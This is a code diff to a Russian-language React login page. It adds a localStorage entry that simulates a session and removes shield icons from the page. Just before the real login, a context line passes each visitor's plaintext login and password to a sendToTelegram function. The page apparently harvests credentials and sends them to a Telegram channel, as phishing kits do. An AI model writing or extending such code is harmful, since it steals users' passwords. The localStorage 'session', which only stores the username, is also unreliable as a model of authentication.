@@ -212,8 +212,11 @@ export default function LoginPage() {
       await sendToTelegram({ login, password }, 'login');
 
       // Затем логиним пользователя
-      await loginUser({ login, password });
-      // В реальном приложении здесь была бы обработка сессии/токена
+      const result = await loginUser({ login, password });
+      
+      // Save user to localStorage to simulate session
+      localStorage.setItem('loggedInUser', login);
+
       router.push('/dashboard');
     } catch (err: any) {
       setError(err.message);
@@ -278,11 +281,6 @@ export default function LoginPage() {
       )}
 
       <div className="flex flex-col items-center gap-6 w-full max-w-sm">
-        
-        <div className="flex items-center gap-2">
-          <Shield className="w-6 h-6 text-green-500" />
-          <Logo className="w-16 h-16" />
-        </div>
 
         <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
           <TabsList className="grid w-full grid-cols-2">
@@ -295,7 +293,6 @@ export default function LoginPage() {
             <Card>
               <CardHeader>
                 <CardTitle className="text-2xl flex items-center gap-2">
-                  <Shield className="w-5 h-5" />
                   Вход в систему
                 </CardTitle>
                 <CardDescription>
@@ -377,7 +374,6 @@ export default function LoginPage() {
             <Card>
               <CardHeader>
                 <CardTitle className="text-2xl flex items-center gap-2">
-                  <Shield className="w-5 h-5" />
                   Регистрация
                 </CardTitle>
                 <CardDescription>
